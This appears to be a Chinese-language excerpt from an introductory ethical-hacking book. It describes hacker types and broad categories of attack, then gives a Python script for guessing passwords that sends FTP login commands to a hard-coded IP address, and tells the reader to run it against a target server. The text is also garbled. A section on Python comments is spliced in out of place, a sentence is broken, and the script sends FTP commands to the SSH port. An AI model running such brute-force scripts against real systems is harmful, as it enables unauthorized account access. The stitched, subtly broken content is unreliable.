# 黑客技术基础
有三种类型的黑客：
1. 白帽
2. 黑帽
3. 灰帽

白帽黑客（也称为道德黑客）试图攻入网络系统，以帮助企业和组织改进其数字防御。同时，黑帽黑客出于恶意目的评估数字记录和设备。灰帽黑客是前两者的结合：他可能有时是白帽，下一刻就变成了黑帽。

重要提示：有法律禁止非法黑客行为。如果你在未经所有者许可的情况下访问数字信息，可能会被关禁。因此，此本书将帮助你成为一名道德黑客。它将为你提供可以在系统中使用的技巧和技术。

# 道德黑客的好处
要保护自己，你需要像黑客一样思考。这一原则是白帽黑客的核心。黑客的总数正在不断增长，这些人一直在不断提高自己的技能和知识。如果你考虑机器和数字网络中存在的漏洞，你会意识到人们在面对黑客时的安全状况是多么糟糕。你需要保护你的系统免受侵害。为了实现这一点，你应该学会如何攻击。白帽黑客的目标是：
- 在不破坏系统的情况下进行攻击
- 识别系统漏洞
- 证明漏洞的存在
- 帮助提高其目标的安全性

# 不同类型的黑客攻击
黑客将攻击分为不同的类型。这些类型包括：

## 非技术性
这些侧重于终端用户（即使用目标设备的人）。由于人类有信任他人的本能，黑客可以在不使用任何电子工具的情况下突破系统的防御。这些黑客可能会使用“社会工程”策略获取用户的信任，并获得网络或文件的访问。你稍后将学习更多关于社会工程的内容。黑客还可能对目标实施物理攻击。例如，他可能会闯入机房并访问其中的计算机。作为替代方案，他可能会在建筑内翻垃圾，寻找有用信息（例如密码）。黑客将这种方法称为“翻垃圾桶”。

## 网络
黑客可以很容易实施这种攻击，因为大多数网络可以通过互联网访问。最常见的网络攻击形式是：
- 使用调制解调器访问网络
- 利用传输机制漏洞（例如 NetBIOS）
- 向网络发送连续请求
- 操纵系统并收集数据

## 系统
这些攻击在任何黑客行为中起着重要作用。是因为计算机有操作系统。有很多你可以使用的操作系统。但黑客通常关注最流行的系统（例如 Windows 系统）。你可以使用的：
- 破坏文件安全
- 破解密码
- 攻击预装认证
- 利用漏洞

## 如何添加注释
你可以在代码中添加注释。在编程中，注释是定义代码功能的单词、句子或段落。它不会影响代码的功能或行为。给代码添加注释不是强制的，但建议这样做。注释将帮助你记住有关代码的信息。显然，你不想忘记程序的内部机制。Python 解释器会跳过每个注释。这意味着解释器将跳过单词、句子或段落，直到找到合法的代码块。在 Python 中，你需要使用 `#` 设置单行注释。对于多行注释，你必须输入三引号。这些符号必须出现在你的开头。以下是用 Python 语言编写的示例：
1. `# Hi, I’m a single-line comment.`
2. `"""Hi,I’mAMultilineComment"""`

# 如何创建一个密码破解器
此时你已经学会黑黑客是一个程序。要创建一个密码工具，你必须使用 Python。你必须的代码是：
```python
#!/usr/bin/python
import socket
def connect(username, password):
    sample = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sample.connect(("192.168.1.107", 22))
    data = sample.recv(1024)
    sample.send("USER " + username + "\n")
    data = sample.recv(1024)
    sample.send("PASS " + password + "\n")
    data = sample.recv(3)
    sample.close()
    return data

username = "Sample"
passwords = ["123", "ftp", "admin", "test", "backup", "password"]
for password in passwords:
    attempt = connect(username, password)
    if attempt == "230":
        print("password found:" + password)
        exit(0)
```
将文件保存为 "password_cracker.py"。然后，获取执行程序的权限并针对目标服务器运行。重要提示：上述代码不是固定的。你可以根据自己的喜好或情况进行修改。一旦你成为熟练的 Python 程序员，你将提高这个密码破解器的灵活性效率。
